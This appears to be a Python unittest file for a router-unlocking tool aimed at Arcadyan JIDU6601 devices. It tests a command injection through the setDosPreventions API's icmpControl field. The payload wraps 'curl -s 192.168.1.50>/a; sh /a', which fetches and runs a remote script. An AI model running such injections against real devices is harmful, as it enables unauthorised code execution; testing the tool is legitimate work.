import unittest

import idu


DOS_BASELINE = {
    "synPacketStatus": "1",
    "synPackets": "128",
    "udpConnectionStatus": "0",
    "udpConnection": "64",
    "icmpPingStatus": "0",
    "icmpPing": "20",
    "icmpControlStatus": "0",
    "icmpControl": "20",
}


class FakeApi:
    """Records the calls the vector makes, and answers the two read probes."""

    def __init__(self, version="SRCMJIO_JIDU6601_R3.2.3", model="JIDU6601",
                 dos=True, baseline=None):
        self.device = idu.Device(model, "Arcadyan", "test", {})
        self.version = version
        self.dos = dos
        self.baseline = dict(baseline or DOS_BASELINE)
        self.mutations = []

    def call(self, method, params=None):
        if method == "getFirmwareDetails":
            return {"results": {"firmwareVersion": self.version}}
        if method == "getDosPreventions":
            if not self.dos:
                return {"code": "ERR_UNKNOWN_METHOD", "message": "no such method"}
            return {"status": "OK", "results": dict(self.baseline)}
        if method == "setDosPreventions":
            self.mutations.append(dict(params or {}))
            return {"status": "OK"}
        raise AssertionError(f"unexpected API call: {method}")


class DosPayloadTests(unittest.TestCase):
    def test_wraps_a_single_line_command(self):
        payload = idu.dos_payload("curl -s 192.168.1.50>/a; sh /a")
        self.assertTrue(payload.startswith("1 -j RETURN; "))
        self.assertTrue(payload.endswith(" #"))
        self.assertIn("curl -s 192.168.1.50>/a; sh /a", payload)

    def test_rejects_a_multiline_command(self):
        with self.assertRaises(idu.IduError):
            idu.dos_payload("echo one\necho two")


class CheckTests(unittest.TestCase):
    def test_dos_route_keeps_a_closed_password_build_unlockable(self):
        verdict = idu.check(FakeApi(version="SRCMJIO_JIDU6601_R3.2.3"))
        self.assertTrue(verdict.method_closed)
        self.assertTrue(verdict.dos_available)
        self.assertIn(idu.DosPreventionVector.name, verdict.vectors)
        self.assertTrue(verdict.unlockable)

    def test_without_dos_the_closed_build_stays_closed(self):
        verdict = idu.check(FakeApi(version="SRCMJIO_JIDU6601_R3.2.3", dos=False))
        self.assertTrue(verdict.method_closed)
        self.assertFalse(verdict.dos_available)
        self.assertFalse(verdict.unlockable)
        self.assertNotIn(idu.DosPreventionVector.name, verdict.vectors)


class ExecuteTests(unittest.TestCase):
    def test_injects_through_icmp_control_and_restores_the_baseline(self):
        api = FakeApi()
        idu.DosPreventionVector().execute(api, "192.168.1.50")

        self.assertEqual(len(api.mutations), 2)
        inject, restore = api.mutations

        self.assertEqual(inject["icmpControlStatus"], "1")
        payload = inject["icmpControl"]
        self.assertTrue(payload.startswith("1 -j RETURN; "))
        self.assertTrue(payload.endswith(" #"))
        self.assertIn("curl -s 192.168.1.50>/a; sh /a", payload)
        self.assertNotIn("\n", payload)

        # What was enabled before is put back; the control field we turned on
        # is left to the setter's default, which is off.
        self.assertEqual(restore.get("synPacketStatus"), "1")
        self.assertEqual(restore.get("synPackets"), "128")
        self.assertNotIn("icmpControlStatus", restore)
        self.assertNotIn("udpConnectionStatus", restore)

    def test_a_rejected_baseline_read_stops_before_injecting(self):
        api = FakeApi(dos=False)
        with self.assertRaises(idu.IduError):
            idu.DosPreventionVector().execute(api, "192.168.1.50")
        self.assertEqual(api.mutations, [])


if __name__ == "__main__":
    unittest.main()
